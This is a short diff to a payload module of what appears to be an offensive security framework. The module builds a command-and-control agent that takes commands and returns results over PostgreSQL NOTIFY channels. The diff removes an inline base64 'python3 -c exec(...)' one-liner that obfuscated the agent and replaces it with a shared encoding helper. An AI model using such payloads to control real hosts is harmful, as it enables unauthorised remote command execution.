@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import base64
-
 from kittysploit import *
 from lib.c2.postgresql_notify_agent import build_postgresql_notify_agent_script
 
@@ -45,6 +43,4 @@ class Module(Payload):
             str(self.command_channel or "ks_cmd"),
             str(self.result_channel or "ks_result"),
         )
-        enc = base64.b64encode(script.encode()).decode("ascii")
-        py = str(self.python_binary or "python3")
-        return f'{py} -c "import base64;exec(base64.b64decode(\'{enc}\').decode())"'
+        return self._encode_python_one_liner(script, self.python_binary)
